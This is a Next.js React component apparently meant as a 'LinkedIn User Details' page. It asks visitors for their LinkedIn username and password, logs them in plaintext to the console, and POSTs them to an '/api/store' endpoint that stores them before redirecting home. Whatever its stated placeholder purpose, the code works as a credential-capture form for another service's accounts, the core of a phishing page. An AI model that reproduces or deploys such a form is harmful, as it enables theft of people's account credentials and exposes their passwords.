"use client";
import React, { useState } from "react";
import { useRouter } from "next/navigation";

export default function LinkedinUserDetailsPage() {
  const router = useRouter();
  const [data, setData] = useState({ username: "", password: "" });

  async function sendCredentials(data: { username: string; password: string }) {
    try {
      const res = await fetch("http://localhost:3000/api/store", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify(data),
        credentials: "include",
      });
      const json = await res.json();
      if (res.ok) {
        console.log("credentials stored successfully");
      } else {
        console.log("error storing credentials", json);
      }
    } catch (error) {
      console.log("network error:", error);
    }
  }

  async function handleLogin(e: React.MouseEvent<HTMLButtonElement>) {
    e.preventDefault();
    console.log("Logging in with:", data);

    await sendCredentials(data);

    router.push("/");
  }
  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-gray-100">
      <h1 className="text-3xl font-bold mb-6">LinkedIn User Details</h1>
      <p className="text-lg text-gray-700">
        This is a placeholder for LinkedIn user details.
      </p>
      <div className="mt-6 p-4 bg-white rounded shadow-md w-96">
        <label className="block mb-2 text-sm font-medium text-gray-700">
          Username:
        </label>
        <input
          type="text"
          className="w-full p-2 border border-gray-300 rounded mb-4"
          placeholder="Enter your LinkedIn username"
          value={data.username}
          onChange={(e) => setData({ ...data, username: e.target.value })}
        />
        <label className="block mb-2 text-sm font-medium text-gray-700">
          Password:
        </label>
        <input
          type="password"
          className="w-full p-2 border border-gray-300 rounded mb-4"
          placeholder="Enter your LinkedIn password"
          value={data.password}
          onChange={(e) => setData({ ...data, password: e.target.value })}
        />
        <button
          onClick={handleLogin}
          className="w-full bg-blue-500 text-white p-2 rounded hover:bg-blue-600 "
        >
          Submit
        </button>
      </div>
    </div>
  );
}
